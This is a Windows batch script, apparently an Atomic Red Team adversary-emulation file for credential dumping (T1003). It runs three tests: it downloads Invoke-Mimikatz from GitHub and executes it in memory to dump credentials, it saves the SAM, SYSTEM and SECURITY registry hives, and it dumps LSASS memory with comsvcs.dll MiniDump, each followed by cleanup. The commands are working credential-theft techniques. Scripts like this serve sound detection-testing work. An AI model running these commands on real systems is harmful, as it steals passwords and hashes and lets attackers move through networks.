@echo off

echo T1003 - Credential Dumping

echo Atomic Test #1 - Powershell Mimikatz
powershell -command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"

echo Atomic Test #4 - Registry dump of SAM, creds, and secrets
reg save HKLM\sam %temp%\sam
reg save HKLM\system %temp%\system
reg save HKLM\security %temp%\security

echo Clean Up Test #4
del %temp%\sam >nul 2> nul
del %temp%\system >nul 2> nul
del %temp%\security >nul 2> nul

echo Atomic Test #6 - Dump LSASS.exe Memory using comsvcs.dll
powershell -command "C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full"

echo Clean Up Test #6
powershell -command "Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore"



